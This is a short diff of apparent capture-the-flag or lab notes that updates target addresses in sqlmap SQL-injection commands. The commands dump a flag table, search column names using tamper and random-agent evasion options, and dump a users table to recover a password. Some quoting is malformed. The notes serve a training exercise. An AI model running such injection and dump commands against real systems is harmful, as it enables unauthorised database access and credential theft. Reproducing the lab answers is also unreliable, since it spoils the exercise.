@@ -14,13 +14,13 @@ sqlmap -r req.txt-u 94.237.49.212:33817/case2.php/?id=1
 
 ```bash
 # What's the contents of table flag1 in testdb database (Case #1)
-sqlmap -u 94.237.49.212:33817/case1.php/ -D testdb -T flag1 --batch --dump --crawl 2
+sqlmap -u 94.237.50.13:51001/case1.php/ -D testdb -T flag1 --batch --dump --crawl 2
 ```
 
 ```bash
 # What's the name of the column containing "style" in it's name (Case #1)
-# sqlmap -u 94.237.63.201:36417/?id=1" --schema
-sqlmap -u "94.237.63.201:36417/case1?id=1" --search -C style --random-agent --tamper=space2comment
+# sqlmap -u 94.237.50.13:51001/?id=1" --schema
+sqlmap -u "94.237.50.13:51001/case1?id=1" --search -C style --random-agent --tamper=space2comment
 
 # What's the Kimberly user's password? (Case #1)
 sqlmap -u 94.237.63.201:36417/?id=1" --dump -D -T users
